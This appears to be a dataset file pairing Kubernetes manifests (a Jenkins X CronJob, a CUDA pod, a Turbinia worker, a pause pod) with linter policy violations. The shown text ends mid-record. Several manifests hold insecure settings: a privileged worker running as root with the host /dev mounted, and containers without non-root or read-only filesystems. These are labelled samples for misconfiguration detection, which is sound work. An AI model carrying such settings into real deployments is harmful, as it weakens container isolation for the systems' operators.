[
  {
    "id": "6725",
    "manifest_path": "data/manifests/the_stack_sample/sample_2443.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.280\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gcactivities\" does not have a read-only root file system"
  },
  {
    "id": "6726",
    "manifest_path": "data/manifests/the_stack_sample/sample_2443.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.280\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-gcactivities\" not found"
  },
  {
    "id": "6727",
    "manifest_path": "data/manifests/the_stack_sample/sample_2443.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.280\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gcactivities\" is not set to runAsNonRoot"
  },
  {
    "id": "6728",
    "manifest_path": "data/manifests/the_stack_sample/sample_2443.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.280\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gcactivities\" has cpu request 0"
  },
  {
    "id": "6729",
    "manifest_path": "data/manifests/the_stack_sample/sample_2443.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.280\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gcactivities\" has memory limit 0"
  },
  {
    "id": "6730",
    "manifest_path": "data/manifests/the_stack_sample/sample_2444.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: shared-gpu-pod\nspec:\n  containers:\n  - name: cuda-container\n    image: nvidia/cuda:9.0-devel\n    command:\n    - /bin/bash\n    - -c\n    - 'trap : TERM INT; sleep infinity & wait'\n    resources:\n      limits:\n        deepomatic.com/shared-gpu: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cuda-container\" does not have a read-only root file system"
  },
  {
    "id": "6731",
    "manifest_path": "data/manifests/the_stack_sample/sample_2444.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: shared-gpu-pod\nspec:\n  containers:\n  - name: cuda-container\n    image: nvidia/cuda:9.0-devel\n    command:\n    - /bin/bash\n    - -c\n    - 'trap : TERM INT; sleep infinity & wait'\n    resources:\n      limits:\n        deepomatic.com/shared-gpu: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cuda-container\" is not set to runAsNonRoot"
  },
  {
    "id": "6732",
    "manifest_path": "data/manifests/the_stack_sample/sample_2444.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: shared-gpu-pod\nspec:\n  containers:\n  - name: cuda-container\n    image: nvidia/cuda:9.0-devel\n    command:\n    - /bin/bash\n    - -c\n    - 'trap : TERM INT; sleep infinity & wait'\n    resources:\n      limits:\n        deepomatic.com/shared-gpu: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cuda-container\" has cpu request 0"
  },
  {
    "id": "6733",
    "manifest_path": "data/manifests/the_stack_sample/sample_2444.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: shared-gpu-pod\nspec:\n  containers:\n  - name: cuda-container\n    image: nvidia/cuda:9.0-devel\n    command:\n    - /bin/bash\n    - -c\n    - 'trap : TERM INT; sleep infinity & wait'\n    resources:\n      limits:\n        deepomatic.com/shared-gpu: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cuda-container\" has memory limit 0"
  },
  {
    "id": "6734",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"worker\" is using an invalid container image, \"us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6735",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "6736",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-filestore\" does not have a read-only root file system"
  },
  {
    "id": "6737",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"worker\" does not have a read-only root file system"
  },
  {
    "id": "6738",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"worker\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "6739",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"worker\" is privileged"
  },
  {
    "id": "6740",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-filestore\" is not set to runAsNonRoot"
  },
  {
    "id": "6741",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"worker\" is not set to runAsNonRoot"
  },
  {
    "id": "6742",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/dev\" is mounted on container \"worker\""
  },
  {
    "id": "6743",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-filestore\" has cpu request 0"
  },
  {
    "id": "6744",
    "manifest_path": "data/manifests/the_stack_sample/sample_2445.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: turbinia-worker\n  labels:\n    app: turbinia-worker\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: turbinia-worker\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9200'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: turbinia-worker\n    spec:\n      initContainers:\n      - name: init-filestore\n        image: busybox:1.28\n        command:\n        - sh\n        - -c\n        - chmod go+w /mnt/turbiniavolume\n        volumeMounts:\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n      containers:\n      - name: worker\n        image: us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-worker:latest\n        securityContext:\n          privileged: true\n        env:\n        - name: TURBINIA_CONF\n          valueFrom:\n            configMapKeyRef:\n              name: turbinia-config\n              key: TURBINIA_CONF\n        - name: TURBINIA_EXTRA_ARGS\n          value: -d\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n          readOnly: true\n        - mountPath: /var/run/lock\n          name: lockfolder\n          readOnly: false\n        - mountPath: /mnt/turbiniavolume\n          name: turbiniavolume\n        ports:\n        - containerPort: 9200\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 8192Mi\n            cpu: 32000m\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lockfolder\n        hostPath:\n          path: /var/run/lock\n      - name: turbiniavolume\n        persistentVolumeClaim:\n          claimName: turbiniavolume-claim\n          readOnly: false\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-filestore\" has memory limit 0"
  },
  {
    "id": "6745",
    "manifest_path": "data/manifests/the_stack_sample/sample_2447.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    color: blue\nspec:\n  affinity:\n    podAffinity:\n      requiredDuringSchedulingIgnoredDuringExecution:\n      - labelSelector:\n          matchLabels:\n            color: blue\n        topologyKey: topology.kubernetes.io/zone\n        namespaces:\n        - sched-test\n        - sched-setup\n  containers:\n  - image: k8s.gcr.io/pause:3.4.1\n    name: pause\n    ports:\n    - containerPort: 80\n    resources:\n      limits:\n        cpu: 100m\n        memory: 500Mi\n      requests:\n        cpu: 100m\n        memory: 500Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pause\" does not have a read-only root file system"
  },
  {
    "id": "6746",
    "manifest_path": "data/manifests/the_stack_sample/sample_2447.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    color: blue\nspec:\n  affinity:\n    podAffinity:\n      requiredDuringSchedulingIgnoredDuringExecution:\n      - labelSelector:\n          matchLabels:\n            color: blue\n        topologyKey: topology.kubernetes.io/zone\n        namespaces:\n        - sched-test\n        - sched-setup\n  containers:\n  - image: k8s.gcr.io/pause:3.4.1\n    name: pause\n    ports:\n    - containerPort: 80\n    resources:\n      limits:\n        cpu: 100m\n        memory: 500Mi\n      requests:\n        cpu: 100m\n        memory: 500Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pause\" is not set to runAsNonRoot"
  },
  {
    "id": "6747",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
